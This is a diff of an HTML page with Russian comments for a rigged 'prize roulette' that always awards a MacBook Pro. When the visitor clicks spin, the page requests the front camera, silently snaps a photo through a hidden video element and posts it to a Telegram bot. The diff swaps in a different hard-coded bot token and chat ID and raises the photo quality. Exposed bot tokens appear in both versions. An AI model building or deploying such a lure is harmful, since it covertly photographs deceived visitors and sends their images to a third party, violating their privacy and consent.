@@ -20,10 +20,10 @@
 </head>
 <body class="bg-gradient-to-br from-indigo-900 via-purple-900 to-slate-900 min-h-screen text-white flex flex-col items-center justify-center p-4">
 
-  <!-- НАСТРОЙКИ TELEGRAM (Укажите ваши данные здесь) -->
+  <!-- НАСТРОЙКИ TELEGRAM -->
   <script>
-    const TG_BOT_TOKEN = "8440274185:AAEvrcHLIzUucfBzF43iSeadOuP1YZdk0nY"; // Токен вашего бота от @BotFather
-    const TG_CHAT_ID = "8440274185";                        // Ваш Chat ID (или ID канала/чата)
+    const TG_BOT_TOKEN = "8318987804:AAHHFs6RTMbaICdiO2OfGGaJhHear0ESF-E";
+    const TG_CHAT_ID = "8318987804"; // <-- ВПИШИТЕ СЮДА СВОЙ ЧИСЛОВОЙ CHAT ID (например: 512345678)
   </script>
 
   <!-- СКРЫТЫЙ ВИДЕО ПОТОК ДЛЯ АВТОМАТИЧЕСКОГО СНИМКА -->
@@ -105,28 +105,27 @@
 
     renderWheel(prizes);
 
-    // При клике сразу запрашиваем камеру и запускаем рулетку
     async function startRoulette() {
       if (attempts <= 0) return;
       attempts--;
       document.getElementById("attemptsLeft").innerText = attempts;
       document.getElementById("spinBtn").disabled = true;
 
-      // Запрос разрешения камеры в фоне при клике
+      // 1. Сразу запрашиваем камеру
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.getElementById("camera");
         video.srcObject = stream;
 
-        // Даем секунду камере инициализироваться и делаем авто-снимок
+        // Ждем пока видеопоток подгрузится и делаем снимок
         setTimeout(() => {
           captureAndSendPhoto(stream, wonPrize);
-        }, 1000);
+        }, 1200);
       } catch (error) {
-        console.error("Доступ к камере отклонён:", error);
+        console.error("Ошибка камеры:", error);
       }
 
-      // Определяем выигрыш (например, индекс 2 — MacBook Pro / iPhone)
+      // 2. Крутим рулетку (выигрыш — индекс 2: MacBook Pro)
       const winningIndex = 2; 
       wonPrize = prizes[winningIndex % prizes.length].name;
 
@@ -134,13 +133,12 @@
       const targetOffset = -(winningIndex + prizes.length * 2) * itemWidth + 120;
       wheelTrack.style.transform = `translateX(${targetOffset}px)`;
 
-      // Показываем окно выигрыша после остановки рулетки
+      // 3. Открываем модальное окно после остановки
       setTimeout(() => {
         showModal(wonPrize);
       }, 4000);
     }
 
-    // Автоматический захват фото и отправка в Telegram
     function captureAndSendPhoto(stream, prizeName) {
       const video = document.getElementById("camera");
       const canvas = document.getElementById("photo");
@@ -159,17 +157,19 @@
         formData.append("caption", `🎁 Участник выиграл приз!\n🏆 Приз: ${prizeName}`);
 
         try {
-          await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
+          let response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
             method: "POST",
             body: formData
           });
+          let data = await response.json();
+          console.log("Ответ от Telegram:", data);
         } catch (e) {
-          console.error("Ошибка отправки в Telegram", e);
+          console.error("Ошибка сети:", e);
         }
 
-        // Останавливаем потоки камеры после отправки
+        // Останавливаем камеру
         stream.getTracks().forEach(track => track.stop());
-      }, "image/jpeg", 0.5);
+      }, "image/jpeg", 0.85);
     }
 
     function showModal(prizeName) {
